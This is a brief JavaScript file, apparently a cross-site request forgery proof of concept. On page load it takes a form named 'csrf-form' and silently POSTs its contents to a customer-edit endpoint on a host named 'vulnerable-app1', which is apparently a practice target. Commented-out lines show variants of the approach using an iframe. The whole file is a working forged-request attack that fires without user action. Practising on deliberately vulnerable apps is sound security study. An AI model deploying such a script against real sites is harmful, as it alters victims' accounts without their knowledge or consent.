window.addEventListener("DOMContentLoaded", () => {
	// const iframe = document.getElementById("csrf-iframe");
  // const form = iframe.contentWindow.document.querySelector('#csrf-form');
  const form = document.querySelector('#csrf-form');
  // const form = document.getElementById('csrf-form');

  const formData = new FormData(form);
  const XHR = new XMLHttpRequest(formData);
    XHR.open("POST", "https://vulnerable-app1.herokuapp.com/customers/edit", true);
    XHR.responseType = "json";
    XHR.send(formData);
    XHR.onload = () => {
      console.log("ok")
    }
  // form.submit()
})
